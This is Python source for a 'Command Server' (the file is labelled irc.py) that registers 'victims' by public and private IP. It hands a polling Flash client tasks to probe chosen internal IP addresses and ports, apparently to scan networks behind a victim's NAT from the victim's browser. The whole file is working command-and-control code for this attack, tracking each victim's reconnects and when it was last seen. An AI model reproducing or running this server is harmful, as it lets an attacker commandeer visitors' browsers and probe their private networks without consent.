#!/usr/bin/env python
#filename=irc.py
from base import *
import socket
import random
import struct
import select
from datetime import datetime

class Victim():
	VIC_ID = ""
	PUBLIC_IP = ""
	PRIVATE_IP=""
	LAST_SEEN = None
	TESTS = []
	def __init__(self,pub_ip,priv_ip,tests=None):
		global VIC_ID, PUBLIC_IP, PRIVATE_IP, TESTS,LAST_SEEN
		self.PUBLIC_IP = pub_ip.strip()
		self.PRIVATE_IP= priv_ip.strip()
		#self.VIC_ID = self.PUBLIC_IP.replace(".","").replace(":","") + self.PRIVATE_IP.replace(".","").replace(":","")
		self.VIC_ID = self.PUBLIC_IP + "-" + self.PRIVATE_IP
		self.LAST_SEEN = datetime.now()	
		if tests != None: 
			self.TESTS=tests
	def addTest(self,proto, private_ip, private_port):
		global TESTS
		loTest = self.Test(proto,self.PUBLIC_IP, private_ip,private_port)
		self.TESTS.append(loTest)
	def _reload(self):
		self.TESTS.append(self.Test("RELOAD","","",""))
	class Test():
		TEST_ID= ""
		PUBLIC_IP = ""
		PRIVATE_IP=""
		PRIVATE_PORT=""
		PUBLIC_PORT=""
		TEST_TYPE=""
		RESULT=False
		STATUS="" #NEW, INPROGRESS or DONE
		TRANSPORT="" #TCP or UDP
		def __init__(self,test_type, public_ip,private_ip,private_port):
			global TEST_ID, TEST_TYPE, PUBLIC_IP, PRIVATE_IP, PRIVATE_PORT, PUBLIC_PORT, TEST_TYPE, RESULT, STATUS,TRANSPORT
			self.TEST_TYPE=test_type			
			self.PUBLIC_IP=public_ip
			self.PRIVATE_IP=private_ip
			self.PRIVATE_PORT = private_port
			self.PUBLIC_PORT = "0"
			self.RESULT=False
			self.TEST_ID = self.createTestId()
			self.STATUS= "NEW"
		def createTestId(self):
			testid = str(datetime.now())
			testid = testid.replace("-","")
			testid = testid.replace(":","")
			testid = testid.replace(" ","")
			testid = testid.replace(".","")
			return testid
		def getTestString(self):
			#this is the command format as expected by the flash application
			if self.TEST_TYPE =="RELOAD":
				return "RELOAD"
			else:
				return "TEST " + self.TEST_TYPE + " " +  self.PRIVATE_IP + " " + self.PRIVATE_PORT + " " + self.TEST_ID
#end class
#end class
class CMDProtoHandler(asyncore.dispatcher_with_send):
	VICTIMS = []
	def __init__(self,conn_sock, client_address, server):
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort), 1)
	def handle_read(self):
		global VICTIMS, LAST_SEEN
		request = self.recv(1024).strip()
		if (request == ""): return
		parts = request.split(" ")
		if len(parts)==2:
			ci = parts[1] #client identifier
		else:
			ci = ""
		if parts[0]=="REG":
			#new client received, grap local ip and return test id
			vic = Victim(self.getpeername()[0],ci)
			vixexists=False
			for victim in self.VICTIMS:
				if victim.VIC_ID == vic.VIC_ID:
					vixexists=True
					break
			if vixexists != True:
				self.server.log("New client registered as " + vic.VIC_ID, 2)
				self.VICTIMS.append(vic)
			else:
				self.server.log("Victim reconnected : " + vic.VIC_ID, 2)
			self.send("SET ID " + vic.VIC_ID + "\n")
		elif parts[0]=="POLL":
			#self.server.log("POLLING request from " + parts[1], 1)
			test = self.getVicTest(request)
			if test != None:
				self.send(test.getTestString() + "\n")
				test.STATUS="INPROGRESS"
				for vic in self.VICTIMS:
					if vic.VIC_ID == parts[1]:
						self.server.log(vic.VIC_ID + " : send " + test.TEST_ID,0)
						vic.LAST_SEEN = datetime.now()
						break
		elif parts[0]=="ERROR":
			self.server.log("Flash client generated an error" + request)
		else:
			self.server.log("Invallid command.",0)
	def getVicTest(self,cmd):
		global VICTIMS
		test = None
		pollreq = cmd.split(" ")
		if len(pollreq) != 2:
			self.server.log("Invallid POLL request: " + cmd, 0)
		else:
			for vic in self.VICTIMS:
				if vic.VIC_ID == pollreq[1]:
					for xtest in vic.TESTS:
						if xtest.STATUS=="NEW":
							test = xtest
							break
		return test
	#end def		
#end class


class Server(Base):
	def __init__(self,serverPort=60006,proto="TCP", caller=None):
		self.TYPE = "Command Server"
		Base.__init__(self,"TCP",serverPort,caller)
		self.log("Started",0)
	#end def
	def protocolhandler(self,conn, addr):
		global HANDLER
		self.HANDLER = CMDProtoHandler(conn,addr,self)
	#end def
#end class

